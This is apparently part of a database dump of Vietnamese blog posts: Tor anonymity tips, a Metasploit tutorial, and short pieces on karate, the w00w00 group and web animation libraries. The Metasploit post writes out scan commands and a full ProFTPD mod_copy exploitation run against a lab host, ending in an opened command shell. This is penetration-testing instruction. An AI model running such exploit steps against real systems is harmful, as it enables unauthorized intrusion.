<p>\r\n                            Còn tùy. Trình duyệt Tor giảm thiểu nguy cơ bị gián điệp và nghe trộm, nhưng ngày nay không có gì là hoàn hảo được. Mạng Tor cũng có những điểm yếu của nó, chủ yếu xuất hiện ở các endpoints nơi lưu lượng truy cập rời khỏi mạng lưới của Tor. <br>\r\n                            Nhưng Tor là một trong những lựa chọn tốt nhất mà chúng ta hiện có. Tuy nhiên, mình khuyên bạn không nên làm rối cài đặt mặc định của Tor trừ khi bạn biết mình đang làm gì. Đó là bởi vì việc bật Javascript và các plugin khác có thể góp phần làm rò rỉ địa chỉ IP của bạn. <br>\r\n                            Sự phổ biến của onion router đã thúc đẩy tin tặc tạo ra các phần mềm độc hại và làm cho nó giống như trình duyệt Tor. Đây là điều mà người dùng nên lo lắng. Ngoài ra, Tor là cánh cổng dẫn đến dark web và các hoạt động phạm tội. Loại nội dung có sẵn trên dark web không phù hợp với nhiều người dùng bình thường. <br>\r\n                            Hơn nữa, bạn không thể làm ngơ trước thực tế rằng chỉ một chút sai sót của bạn cũng sẽ góp phần làm lộ danh tính của bạn trên internet. TOR không đọc được suy nghĩ của bạn và ngăn chặn bất kỳ hành động ngu ngốc nào mà bạn có thể thực hiện. Vì vậy, có một số điều bạn cần lưu ý và nó sẽ giúp bạn ẩn danh trên mạng.\r\n                        </p>\r\n                        <h1>9 điều tuyệt đối không nên làm khi sử dụng Tor</h1>\r\n                        <h3>1. Không sử dụng điện thoại di động của bạn để xác minh 2 bước trên Tor</h3>\r\n                        <p>\r\n                            Hầu hết các trang web đều cung cấp quy trình xác minh 2 bước bằng điện thoại, trong đó OTP (Mật khẩu dùng một lần) được gửi đến số của bạn, cho phép bạn đăng nhập vào tài khoản của mình một cách an toàn. Hãy hết sức cẩn thận khi bạn đang sử dụng trình duyệt TOR để truy cập tài khoản của mình. <br>\r\n                            Nếu bạn cung cấp số điện thoại di động của mình cho một trang web, điều đó sẽ tiết lộ thông tin cá nhân cả bạn, vì tin tặc sẽ dễ dàng theo dõi bạn hơn bằng cách sử dụng số của bạn. Lưu ý rằng ngay cả khi bạn đang sử dụng thẻ SIM được đăng ký với tên của người khác, nhà mạng có thể dễ dàng theo dõi bạn vì họ cũng giữ số IMEI của thiết bị trong cơ sở dữ liệu của họ và có thể được sử dụng để theo dõi bạn.\r\n                        </p>\r\n                        <h3>2. Không sử dụng tài khoản người dùng bên ngoài TOR</h3>\r\n                        <p>\r\n                            Nếu bạn sử dụng trình duyệt TOR để kiểm tra tài khoản Facebook, Twitter hoặc email của mình, đừng bao giờ sử dụng những tài khoản đó bên ngoài trình duyệt TOR vì nó sẽ để lộ danh tính trực tuyến của bạn trên web. Hầu hết mọi trang web hiện nay đều ghi lại thông tin như thời gian đăng nhập và đăng xuất, vị trí của bạn, địa chỉ IP của bạn và các chi tiết khác. Sử dụng tài khoản của bạn trên Internet dù chỉ một lần cũng đủ để lấy địa chỉ IP của bạn và cuối cùng làm lộ danh tính của bạn.\r\n                        </p>\r\n                        <h3>3. Không đăng thông tin cá nhân</h3>\r\n                        <p>\r\n                            Bạn phải luôn ghi nhớ điều này trong tim, không đăng bất kỳ thông tin cá nhân nào như tên, địa chỉ, ngày sinh, số thẻ tín dụng khi sử dụng TOR. Nó sẽ tiết lộ danh tính của bạn, và sẽ không có ích gì khi sử dụng TOR. <br>\r\n                            Vì vậy, bạn nên tạo tài khoản với địa chỉ email mới không liên kết với danh tính thực của bạn. Bạn có thể sử dụng email đó cho các tài khoản xã hội của mình và tận hưởng tính ẩn danh trên Tor.\r\n                        </p>\r\n                        <h3>4. Không gửi dữ liệu không được mã hóa qua TOR</h3>\r\n                        <p>\r\n                            TOR mã hóa kết nối của bạn chứ không phải dữ liệu của bạn và các exit nodes của TOR rất dễ bị tấn công. Vì vậy, bạn không nên gửi dữ liệu chưa được mã hóa qua mạng TOR, vì ai đó có thể truy cập thông tin bí mật của bạn khi dữ liệu ở node cuối cùng. Biện pháp cho việc này là sử dụng VPN cùng với Tor, đọc chi tiết tại đây.\r\n                        </p>\r\n                        <h3>5. Không sử dụng TOR với Windows?</h3>\r\n                        <p>\r\n                            Windows của Microsoft là hệ điều hành được sử dụng nhiều nhất trên thế giới dành cho máy tính để bàn. Các phiên bản Tor dành cho Windows cũ hơn đã xuất hiện các lỗ hổng có khả năng tiết lộ danh tính của bạn ngay cả khi bạn đang sử dụng TOR để truy cập internet. Do đó, việc sử dụng Tor trên Windows vẫn là một chủ đề đang được quan tâm. <br>\r\n                            Hệ điều hành Linux sẽ phục vụ bạn tốt cho mục đích này. Các bản phân phối Linux như Tails và Whonix được cấu hình sẵn với TOR. Bạn có thể định cấu hình Tor theo cách thủ công trên bất kỳ bản phân phối nào bạn thích. Nhưng tốt nhất là bạn nên sử dụng Top các hệ điều hành ẩn danh này.\r\n                        </p>\r\n                        <h3>6. Đừng quên xóa cookie và dữ liệu trang web</h3>\r\n                        <p>\r\n                            Khi bạn truy cập một trang web, nó sẽ gửi một tệp nhỏ đến máy tính của bạn, được gọi là cookie. Nó lưu giữ hồ sơ về thói quen duyệt web của bạn và các dữ liệu khác để trang web có thể nhận ra bạn trong lần truy cập tiếp theo. Một số trang web cũng có thể lưu trữ dữ liệu cục bộ trên ổ cứng của bạn. <br>\r\n                            Bạn nên xóa các tệp cookie đó và dữ liệu trang web cục bộ sau mỗi phiên duyệt web trên TOR. Những điều này có thể cho phép trang web thu thập thông tin về bạn và theo dõi vị trí và địa chỉ IP của bạn. <br>\r\n                            Các phiên bản sau của trình duyệt Tor sẽ tự động xóa cookie trang web và lịch sử tải xuống sau khi bạn kết thúc phiên. Ngoài ra, bạn có thể nhấp vào tùy chọn New Identity (nhấp vào nút củ hành trước thanh địa chỉ) để thực hiện tính năng tương tự mà không cần đóng trình duyệt Tor.\r\n                        </p>\r\n                        <h3>7. Không sử dụng TOR cho Google Search</h3>\r\n                        <p>\r\n                            Nếu bạn muốn ẩn danh khi sử dụng TOR, đừng sử dụng Google để tìm kiếm các truy vấn của bạn. Mặc dù nghe có vẻ kỳ lạ, điều này là do Google thu thập thông tin như yêu cầu tìm kiếm, lưu trữ các tệp cookie trên máy tính và theo dõi thói quen duyệt web của bạn để cung cấp cho các dịch vụ quảng cáo. <br>\r\n                            Bạn không muốn như vậy, phải không? Vì vậy, bạn có thể sử dụng các công cụ tìm kiếm khác như DuckDuckGo và StartPage vì chúng không ghi lại địa chỉ IP của bạn hoặc bất kỳ hoạt động nào khác. Trên thực tế, đã có những trường hợp Google hoạt động không chính xác với Tor. Nó có thể hiển thị thông báo lỗi hoặc yêu cầu bạn xác thực.\r\n                        </p>\r\n                        <h3>8. Không sử dụng trang web HTTP trên TOR</h3>\r\n                        <p>\r\n                            Bạn nên biết rằng TOR có thể bị khai thác bằng cách sử dụng các lỗ hổng có tại exit nodes. Vì vậy, nếu bạn truy cập các trang web HTTP bằng TOR, có khả năng ai đó có thể truy cập thông tin của bạn khi thông tin đó ở các exit nodes. Dữ liệu được truyền đến và đi từ một trang web HTTP không được mã hóa và có thể được xem ở các exit nodes vì TOR chỉ mã hóa kết nối bên trong mạng lưới của nó. <br>\r\n                            Bạn có thể ngăn chặn những tình huống như vậy bằng cách sử dụng các trang web HTTPS. Họ sử dụng các giao thức mã hóa end-to-end như SSL và TLS. Vì vậy, tất cả dữ liệu của bạn vẫn an toàn, ngay cả khi nó nằm ngoài mạng TOR.\r\n                        </p>\r\n                        <h3>9. Không kết nối đồng thời với cùng một máy chủ</h3>\r\n                        <p>\r\n                            Đây là một điều quan trọng mà bạn cần ghi nhớ. Nếu bạn đang truy cập một máy chủ từ xa cụ thể bằng TOR (ẩn danh), thì không nên truy cập vào cùng một máy chủ đó từ bên ngoài mạng TOR (không ẩn danh) vì điều đó có thể dẫn đến việc tiết lộ danh tính thực của bạn. Điều này là do trong trường hợp internet của bạn bị ngắt, cả hai kết nối của bạn sẽ kết thúc cùng một lúc và sẽ không quá khó khăn để tin tặc nhận thấy điều này. <br>\r\n                            Ngoài ra, một máy chủ web có thể cố gắng đoán ra hai kết nối đó bằng cách tăng hoặc giảm tốc độ trên một trong các kết nối TOR hoặc không phải TOR của bạn để xem liệu tốc độ có thay đổi hay không và do đó theo dõi địa chỉ IP thực của bạn.\r\n                        </p>\r\n                        <h1>Tại sao bạn nên ẩn danh bằng Tor?</h1>\r\n                        <p>\r\n                            Bây giờ, chúng ta đã thảo luận về việc liệu Tor có ẩn danh hay không và bạn nên tuân theo những điều nào để được an toàn trên mạng. Dưới đây là một số lý do và lợi ích của việc ẩn danh bằng Tor: <br>\r\n                            + ISP của bạn không thể theo dõi hoạt động duyệt web của bạn. <br>\r\n                            + Những tin tặc sẽ không thể theo dõi bạn. <br>\r\n                            + Các trang web và dịch vụ không thể theo dõi dữ liệu của bạn và hiển thị quảng cáo được cá nhân hóa. <br>\r\n                            + Bạn có thể làm bất cứ điều gì bạn muốn mà không bị đánh giá. <br>\r\n                            + Bạn có thể chia sẻ dữ liệu bí mật trong khi ẩn danh.\r\n                        </p>\r\n                        <h1>Tổng kết</h1>\r\n                        <p>\r\n                            TOR là một lựa chọn tuyệt vời để ẩn danh trên internet, ngay cả khi các quốc khác chỉ trích nó hoạt động như một nơi cho các hoạt động bất hợp pháp. Nhưng Tor không được tạo ra cho mục đích đó. Bạn chỉ cần thực hiện một số biện pháp phòng ngừa ở trên để không bị theo dõi trên mạng. <br>\r\n                            Cuối cùng là dự án Tor được phòng thí nghiệm nghiên cứu hải quân Hoa Kỳ tài trợ và phát triển =)). Nên mình không dùng Tor nhiều cho mấy.\r\n                        </p>\r\n                    </aside>\r\n            </article><br>\r\n            copyright by:AnonyViet.com', '', 'admin', 0, '2024-06-29 06:25:21'),
(11, 'news forums', '', '<article class=\"tin\">\r\n                    <aside>\r\n                        <h3 id=\"textTin\">Cách Quét lỗ hổng bảo mật bằng Metasploit</h3>\r\n                        <div>\r\n                            <p>\r\n                                Trong quá trình thử nghiệm Kali Nethunter trên OnePlus, mình đã tìm kiếm các công cụ và quy trình làm việc có thể chạy trên một thứ gì đó nhẹ như điện thoại Android. Mình cũng muốn xem mình có thể đi được bao xa mà không cần phải dùng VPS hay Server bên ngoài.\r\n                            </p>\r\n                            <img src=\"images2/1_-sGG-7EvvTzOBSkhSqe8RQ-1.png\" alt=\"\">\r\n                            <p>\r\n                                Quét lỗ hổng bảo mật bằng OpenVAS, Nessus hoặc bất kỳ thứ gì khác chạy tốt trên phần cứng nhẹ. Theo kinh nghiệm của mình, một máy quét lỗ hổng chuyên dụng sẽ khá tốn nhiều tài nguyên. <br>\r\n                                Vì vậy, khi sử dụng Metasploit làm công cụ chính để khai thác phần mềm dễ bị tấn công, mình muốn chia sẻ một số mẹo mà mình đã tìm thấy để thực hiện quét lỗ hổng bảo mật bằng Metasploit.\r\n                            </p>\r\n                            <h1>Nmap + Metasploit</h1>\r\n                            <p>\r\n                                Gần đây mình đã phát hiện ra rằng bạn có thể sử dụng nmap trực tiếp từ Metasploit bằng cách sử dụng mô-đun db_nmap. Sử dụng mô-đun này khá tốt vì bạn có thể nhận được kết quả được nhập trực tiếp vào Metasploit.<br>\r\n                                Dưới đây là một ví dụ về lệnh db_nmap trong Metasploit: <br> \r\n                                <code>msf6 > db_nmap -sV 192.168.1.5</code> <br>\r\n                                Đây là kết quả đầu ra (máy chủ này đang chạy container Docker dễ bị tấn công): <br>\r\n                                <code>\r\n                                    msf6 > db_nmap -sV 192.168.1.5 <br>\r\n                                    [*] Nmap: Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-08 03:47 UTC <br>\r\n                                    [*] Nmap: Nmap scan report for 192.168.1.5 (192.168.1.5) <br>\r\n                                    [*] Nmap: Host is up (0.12s latency). <br>\r\n                                    [*] Nmap: rDNS record for 192.168.1.5: 192.168.1.5.vultr.com <br>\r\n                                    [*] Nmap: Not shown: 991 closed ports <br>\r\n                                    [*] Nmap: PORT     STATE    SERVICE     VERSION <br>\r\n                                    [*] Nmap: 21/tcp   open     ftp         ProFTPD 1.3.5 <br>\r\n                                    [*] Nmap: 22/tcp   open     ssh         OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.13 (Ubuntu Linux; protocol 2.0) <br>\r\n                                    [*] Nmap: 25/tcp   filtered smtp <br>\r\n                                    [*] Nmap: 80/tcp   open     http        Apache httpd 2.4.7 ((Ubuntu)) <br>\r\n                                    [*] Nmap: 139/tcp  open     netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP) <br>\r\n                                    [*] Nmap: 445/tcp  open     netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP) <br>\r\n                                    [*] Nmap: 631/tcp  open     ipp         CUPS 1.7 <br>\r\n                                    [*] Nmap: 6667/tcp open     irc         UnrealIRCd <br>\r\n                                    [*] Nmap: Service Info: Hosts: VULN, irc.TestIRC.net; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel <br>\r\n                                    [*] Nmap: Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . <br>\r\n                                    [*] Nmap: Nmap done: 1 IP address (1 host up) scanned in 18.18 seconds <br>\r\n                                </code>\r\n                                Bây giờ, Metasploit đã biết về các dịch vụ trên máy chủ đó. Kiểm tra bằng lệnh services : <br>\r\n                                <code>\r\n                                    msf6 > services <br>\r\n                                    Services <br>\r\n                                    ======== <br>\r\n                                    host          port  proto  name         state     info <br>\r\n                                    ----          ----  -----  ----         -----     ---- <br>\r\n                                    192.168.1.5  21    tcp    ftp          open      ProFTPD 1.3.5 <br>\r\n                                    192.168.1.5  22    tcp    ssh          open      OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.13 Ubuntu Linux; proto \r\n                                                                                    col 2.0  <br>\r\n                                    192.168.1.5  25    tcp    smtp         filtered <br>\r\n                                    192.168.1.5  80    tcp    http         open      Apache httpd 2.4.7 (Ubuntu) <br>\r\n                                    192.168.1.5  139   tcp    netbios-ssn  open      Samba smbd 3.X - 4.X workgroup: WORKGROUP <br>\r\n                                    192.168.1.5  445   tcp    netbios-ssn  open      Samba smbd 3.X - 4.X workgroup: WORKGROUP <br>\r\n                                    192.168.1.5  631   tcp    ipp          open      CUPS 1.7 <br>\r\n                                    192.168.1.5  6667  tcp    irc          open      UnrealIRCd <br>\r\n                                </code>\r\n                                Với db_nmap, nó sẽ tự động nhập các lỗ hổng nếu bạn sử dụng bất kỳ tập lệnh quét lỗ hổng nào của nmap. <br>\r\n                                Đây là một lệnh ví dụ: <br>\r\n                                <code>msf6 > db_nmap -sV --script=vulners.nse 192.168.1.5</code> <br>\r\n                                Sau khi hoàn thành lệnh đó, mình có thể sử dụng lệnh vulns để kiểm tra các khai thác được lưu trữ trong Metasploit đã được phát hiện bằng cách sử dụng nmap: <br>\r\n                                <code>\r\n                                    msf6 > vulns <br>\r\n                                    Vulnerabilities <br>\r\n                                    =============== <br>\r\n                                    Timestamp                Host          Name                             References <br>\r\n                                    ---------                ----          ----                             ---------- <br>\r\n                                    2021-08-08 03:55:55 UTC  192.168.1.5  cpe:/a:proftpd:proftpd:1.3.5     CVE-2015-3306,SAINT:950EB68D408A40399926A4CCAD3CC62E,SAINT:63FB77B9136D48259E4F0D4CDA35E957,SAINT:1B08F4664C428B180EEC9617B41D9A2C,PROFTPD_MOD_COPY,PACKETSTORM:162777,PACKETSTORM:132218,PACKETSTORM:131567,PACKETSTORM:131555,PACKETSTORM:131505,MSF:EXPLOIT/UNIX/FTP/PROFTPD_MODCOPY_EXEC,EDB-ID:49908,EDB-ID:37262,EDB-ID:36803,EDB-ID:36742,1337DAY-ID-23720,1337DAY-ID-23544,SSV:61050,MSF:ILITIES/SUSE-CVE-2019-18217/,CVE-2019-19272,CVE-2019-19271,CVE-2019-19270,CVE-2019-18217,CVE-2016-3125,CVE-2013-4359,CVE-2017-7418\r\n                                    &lt;snipped	&gt; <br>\r\n                                </code>\r\n                                Bạn có thể thấy có một lỗ hổng mà Metasploit đã khai thác trong đầu ra ở trên của các tệp tin: <br>\r\n                                <code>MSF:EXPLOIT/UNIX/FTP/PROFTPD_MODCOPY_EXEC</code> <br> \r\n                                Vì vậy, hãy khai thác nó: <br>\r\n                                <code>\r\n                                    msf6 > use exploit/unix/ftp/proftpd_modcopy_exec <br>\r\n                                    msf6 exploit(unix/ftp/proftpd_modcopy_exec) > set RHOSTS 192.168.1.5 <br>\r\n                                    RHOSTS => 192.168.1.5 <br>\r\n                                    msf6 exploit(unix/ftp/proftpd_modcopy_exec) > set SITEPATH /var/www/html <br>\r\n                                    SITEPATH => /var/www/html <br>\r\n                                    msf6 exploit(unix/ftp/proftpd_modcopy_exec) > set payload cmd/unix/bind_awk  <br>\r\n                                    payload => cmd/unix/bind_awk <br>\r\n                                    msf6 exploit(unix/ftp/proftpd_modcopy_exec) > run  <br>\r\n                                    [*] 192.168.1.5:80 - 192.168.1.5:21 - Connected to FTP server <br>\r\n                                    [*] 192.168.1.5:80 - 192.168.1.5:21 - Sending copy commands to FTP server <br>\r\n                                    [*] 192.168.1.5:80 - Executing PHP payload /VlrUb.php <br>\r\n                                    [*] Started bind TCP handler against 192.168.1.5:4444 <br>\r\n                                    [*] Command shell session 1 opened (0.0.0.0:0 -> 192.168.1.5:4444) at 2021-08-08 04:21:30 +0000 <br>\r\n                                </code>\r\n                                Shell được tạo bằng cách sử dụng kết quả quét lỗ hổng bảo mật được thực hiện trên điện thoại Android <br>\r\n                                Mình khuyên bạn nên sử dụng thêm các tập lệnh quét lỗ hổng nmap với mô-đun db_nmap của Metasploit. <br>\r\n                            </p>\r\n                            <h1>Quét lỗ hổng ứng dụng web</h1><br>\r\n                            <p>\r\n                                Metasploit có một mô-đun quét lỗ hổng ứng dụng web được tích hợp sẵn: WMAP:<br>\r\n                                <a href=\"https://www.offsec.com/metasploit-unleashed/wmap-web-scanner/\">WMAP Web Scanner</a><br>\r\n                                Tài liệu về WMAP trong repo Github cũ của người khác giải thích điều khiến WMAP trở nên đặc biệt:<br>\r\n                                <a href=\"https://github.com/lattera/metasploit/blob/master/documentation/wmap.txt\">https://github.com/lattera/metasploit/blob/master/documentation/wmap.txt</a>\r\n                                Có vẻ như nó không được cập nhật trong 10 năm. Theo giải thích trong liên kết ở trên, WMAP sẽ sử dụng thông tin được lưu trữ trong cơ sở dữ liệu để tấn công mục tiêu của bạn một cách thông minh. Ngoài ra, bạn có thể tạo hồ sơ WMAP để sử dụng các mô-đun mới hơn hoặc thậm chí tùy chỉnh trong Metasploit – điều này làm cho WMAP có thể mở rộng và vẫn phù hợp ở hiện tại.<br>\r\n                                Đầu tiên, tải wmap và định cấu hình mục tiêu của bạn:<br>\r\n                                <code>\r\n                                    msf6 > load wmap<br>\r\n                                    .-.-.-..-.-.-..---..---.<br>\r\n                                    | | | || | | || | || |-\'<br>\r\n                                    `-----\'`-\'-\'-\'`-^-\'`-\'<br>\r\n                                    [WMAP 1.5.1] ===  et [  ] metasploit.com 2012<br>\r\n                                    [*] Successfully loaded plugin: wmap<br>\r\n                                    msf6 > wmap_sites -a http://192.168.1.5<br>\r\n                                    [*] Site created.<br>\r\n                                    msf6 > wmap_targets -t http://192.168.1.5/drupal<br>\r\n                                    msf6 > wmap_targets -l<br>\r\n                                    [*] Defined targets<br>\r\n                                    ===============<br>\r\n                                        Id  Vhost         Host          Port  SSL    Path<br>\r\n                                        --  -----         ----          ----  ---    ----<br>\r\n                                        0   192.168.1.5  192.168.1.5  80    false  /drupal<br>\r\n                                </code><br>\r\n                                Tiếp theo, chạy thử nghiệm đối với mục tiêu của bạn:<br>\r\n                                <code>\r\n                                    msf6 > wmap_run -t<br>\r\n                                    [*] Testing target:<br>\r\n                                    [*]     Site: 192.168.1.5 (192.168.1.5)<br>\r\n                                    [*]     Port: 80 SSL: false<br>\r\n                                    ============================================================<br>\r\n                                    [*] Testing started. 2021-08-08 04:43:27 +0000<br>\r\n                                    [*] Loading wmap modules...<br>\r\n                                    &lt;snipped &gt;<br>\r\n                                </code>\r\n                                Cuối cùng, chạy lệnh quét:<br>\r\n                                <code><br>\r\n                                    msf6 > wmap_run -e <br>\r\n                                    [*] Using ALL wmap enabled modules.<br>\r\n                                    [-] NO WMAP NODES DEFINED. Executing local modules<br>\r\n                                    [*] Testing target:<br>\r\n                                    [*]     Site: 192.168.1.5 (192.168.1.5)<br>\r\n                                    [*]     Port: 80 SSL: false<br>\r\n                                    ============================================================<br>\r\n                                    [*] Testing started. 2021-08-08 04:50:06 +0000<br>\r\n                                    [*] <br>\r\n                                    =[ SSL testing ]=<br>\r\n                                    ============================================================<br>\r\n                                    [*] Target is not SSL. SSL modules disabled.<br>\r\n                                    [*] <br>\r\n                                    =[ Web Server testing ]=<br>\r\n                                    ============================================================<br>\r\n                                    [*] Module auxiliary/scanner/http/http_version<br>\r\n                                    [+] 192.168.1.5:80 Apache/2.4.7 (Ubuntu)<br>\r\n                                    [*] Module auxiliary/scanner/http/open_proxy<br>\r\n                                    [*] Module auxiliary/admin/http/tomcat_administration<br>\r\n                                    &lt;snipped	&gt;<br>\r\n                                </code><br>\r\n                            </p>\r\n                            <h1>Sử dụng cấu hình WMAP tùy chỉnh</h1><br>\r\n                            <p>\r\n                                Trong repo Metasploit Github có một số tài liệu hướng dẫn cách bạn có thể mở rộng WMAP để sử dụng các mô-đun khác bằng cách sử dụng cấu hình WMAP:<br>\r\n                                <a href=\"https://github.com/rapid7/metasploit-framework/blob/master/data/wmap/wmap_sample_profile.txt\">wmap_sample_profile.txt</a>\r\n                                Đây là file:<br>\r\n                                <code>\r\n                                    # <br>\r\n                                    # WMAP 1.0 Sample Profile<br>\r\n                                    # wmap_run -e /path/to/profile<br>\r\n                                    #<br>\r\n                                    # Just add the name of the module. Use # for comments<br>\r\n                                    #<br>\r\n                                    frontpage<br>\r\n                                    frontpage_login<br>\r\n                                    options <br>\r\n                                    version <br>\r\n                                    backup_file <br>\r\n                                    #blind_sql_query <br>\r\n                                    #brute_dirs <br>\r\n                                    copy_of_file <br>\r\n                                    dir_listing <br>\r\n                                    dir_scanner<br>\r\n                                    file_same_name_dir<br>\r\n                                    writable<br>\r\n                                </code>\r\n                                Bạn có thể thấy từ các nhận xét trong tệp rằng bạn có thể mở rộng WMAP để sử dụng các mô-đun khác. Điều này làm cho WMAP thực sự hữu ích vì bạn có thể kiểm tra các mô-đun Metasploit mới hơn hoặc tùy chỉnh trên Web Server.<br>\r\n                                Vì vậy, như một ví dụ đơn giản, bạn có thể sử dụng cấu hình ví dụ đó, đặt nó vào /tmp/wmap-profile và sau đó chạy cấu hình WMAP bằng lệnh sau trong Metasploit:<br>\r\n                                <code>\r\n                                    msf6 > wmap_run -e /tmp/wmap-profile<br>\r\n                                </code>\r\n                                Như mình đã nói trước đó, việc này làm cho WMAP có thể mở rộng và có thể sẽ giữ nó mãi mãi hữu ích khi Rapid 7 tiếp tục tạo và cập nhật các mô-đun của Metasploit.<br>\r\n                            </p>\r\n                        </div>\r\n                    </aside>\r\n            </article><br>\r\n            copyright by:AnonyViet.com', '', 'admin', 0, '2024-06-29 06:25:21'),
(12, 'Karate kyokushin loại karate có tính thực chiến cao', '', 'Kyokushin (極真) [a] là một phong cách karate có nguồn gốc từ Nhật Bản. Đó là một phong cách chiến đấu độc lập toàn diện và bắt nguồn từ triết lý cải thiện bản thân, kỷ luật và rèn luyện chăm chỉ. [5] [6] [7] [8]\r\n\r\nKyokushin Kaikan là tổ chức võ thuật được thành lập vào năm 1964 bởi Masutatsu Oyama người Hàn Quốc-Nhật Bản (大山倍達, Ōyama Masutatsu ) , tên chính thức là Tổ chức Karate Quốc tế . Trước đây, tổ chức này được gọi là Võ đường Oyama . Kể từ năm 1964, phong cách này đã tiếp tục lan rộng ra hơn 120 quốc gia, trở thành một trong những tổ chức võ thuật lớn nhất trên thế giới và ở chính Nhật Bản.', '', 'admin', 0, '2024-06-29 06:25:21'),
(13, 'w00w00', '', 'là nhóm bảo mật phi lợi nhuận lớn nhất trên thế giới, có thời điểm bao gồm hơn 30 người tham gia tích cực và trải dài 12 quốc gia trên năm lục địa <br>\r\nw00w00 phát âm là whoo-whoo là một tổ chức tư vấn bảo mật máy tính được thành lập vào năm 1996 và vẫn hoạt động cho đến đầu những năm 2000[nguồn không đáng tin cậy] mặc dù nhóm này không được biết đến nhiều bên ngoài giới an toàn thông tin, nhưng những người tham gia của nó đã sinh ra hơn một chục công ty CNTT. hai ví dụ nổi tiếng nhất là whatsApp, dịch vụ nhắn tin và Napster, công ty chia sẻ tệp tiên phong.<br><br>\r\ntrang web chính chủ:http://www.w00w00.org<br>', '', 'admin', 0, '2024-06-29 06:25:21'),
(14, 'Một số thư viện css & js để tạo animation cho web mà bạn không nên bỏ qua', '', '1.Animate.css\r\n+ animate.css là một trong những thư viện animation css nhỏ và dễ sử dụng nhất có sẵn. áp dụng thư viện animate cho dự án của bạn đơn giản như liên kết css và thêm các class css bắt buộc vào các phần tử HTML của bạn. bạn cũng có thể sử dụng jquery để kích hoạt các animation trên một sự kiện cụ thể\r\n+ hỗ trợ rất nhiều hiệu ứng rung lắc, lật, zoom in, zoom out... bạn có thể sử dụng những hiệu ứng này đối với link, button hoặc kết hợp với thư viện wow.js để tạo ra hiệu ứng animation mỗi khi cuộn chuột\r\n+ description:\"A cross-browser library of css animations. as easy to use as an easy thing.\"\r\n+ library size: 43kb\r\n+ gitHub: https://github.com/daneden/animate.css\r\n<br><br>\r\n2.bounce.js\r\nđầu tiên bạn hãy vào trang chủ bouncejs.com của nó để trải nghiệm thử, cảm giác rất là thú vị. ưu điểm là dung lượng nhẹ và rất dễ dùng\r\n+ library size: 16kb\r\n+ github: https://github.com/tictail/bounce.js\r\n<br><br>\r\n3 animeJS\r\n+ animeJS được mô tả dưới dạng một thư viện animation Javascript nhẹ, làm việc với bất kỳ thuộc tính css, css transforms, svg hoặc bất kỳ thuộc tính DOM nào, và các đối tượng Javascript - animeJS là thư viện mới nhất trong danh sách, nhưng đã dành được rất nhiều người cải đạo trong 12 tháng kể từ khi nó được sáng tạo. nó cần thiết cho các ứng dụng web đơn dản.\r\n+ library size:10.9kb + github:https:github.com/juliangarnier/anime\r\n<br><br>\r\n4 Magic animations\r\n-magic animations đã là một trong những thư viện animation ấn tượng có sẵn. nó có nhiều hình ảnh động khác nhau, nhiều trong số đó là khá độc đáo cho thư viện này. giống như với animate.css, bạn có thể thực hiện bằng cách đơn giản thêm tệp tin css. bạn cũng có thể sử dụng các hình động từ jquery. -description:css3 animations width special effects -library size:36.5kb - github:https://github.com/miniMAC/magic\r\n<br><br>\r\n5 DynCSS\r\nDynCSS là một thư viện animation mà bạn có thể muốn sử dụng trong trang web của bạn cùng với parallax effect. để có được một ý tưởng rõ ràng về những gì bạn có thể làm với thư viện này, hãy xem bản demo này.\r\n-github:https://github.com/vzaccaria/DynCSS\r\n<br><br>\r\n6 CSShake\r\n-cái tên nói lên tất cả, CSShake sẽ rung lắc bất cứ thành phần web component nào mà bạn muốn. ứng dụng của nó thì nhiều vô kể, ví dụ textbox sẽ rung lắc nếu thông tin bạn nhập chính xác...\r\n-library size:78.8kb\r\n-github:https://github.com/elrumordelaluz/csshake\r\n<br><br>\r\n7 Hover.css\r\n+ Hover.css là một thư viện animation CSS được thiết kế để sử dụng với các nút và các thành phần UI khác trong trang web của bạn\r\n+ thuần túy css 100% rất phù hợp để áp dụng khi hover chuột qua link, button...\r\n+ description: easily apply to your own elements, modify or just use for ispiration\r\n+ library size: 104.2kb\r\n+ github: https://github.com/lanLunn/Hover\r\n<br><br>\r\n8 Velocity.js\r\nVelocity.js là một thư viện javascript thú vị để tạo các hiệu ứng chuyển động như fade, slide, scroll, stop, finish và reverse...\r\n+ library size: 34.8kb\r\n+ github:https://github.com/julianShapiro/velocity\r\n<br><br>\r\n9 AniJS\r\nAniJS là một thư viện animation cho phép bạn thêm các hình động vào các phần tử trong một chuỗi đơn giản. có định lý dạng sau: if click, on square, do wobble animated to. container-box\r\n+ library size: 10.5kb\r\n+ github: https://github.com/anijs/anijs\r\n<br><br>\r\n10 GSAP(greenSock Animation Platform):\r\nGSAP là một thư viện mạnh mẽ và linh hoạt cho việc tạo hoạt ảnh. nó hỗ trợ nhiều loại hiệu ứng và có hiệu suất tốt. GSAP cho phép bạn điều khiển các yếu tố HTML, CSS và SVG trong các hoạt ảnh của bạn.\r\n+ trang chủ:https://github.com/greensock/GSAP\r\n<br><br>\r\n12 three.js\r\nthư viện này tập trung vào tạo ra hiệu ứng hoạt ảnh 3d. three.js sử dụng webgl để vẽ đối tượng 3d và tạo hiệu ứng chuyển động. nó cung cấp nhiều tính năng và công cụ để tạo ra các hiệu ứng 3d phức tạp trên trang web\r\n+ trang chủ:https://threejs.org/\r\n<br><br>\r\n13 FullpageJS\r\nFullPage.js là một thư viện javascript mạnh mẽ và linh hoạt, được sử dụng để tạo các trang web có hiệu ứng cuộn màn hình dọc mượt mà và tương tác. thư viện này giúp bạn xây dựng các trang web có kiểu dáng một trang duyệt qua các phần tử hoặc các phần mà người dùng có thể cuộn qua.\r\n+ trang chủ:https://alvarotrigo.com/fullPage/', '', 'admin', 0, '2024-06-29 06:25:21'),
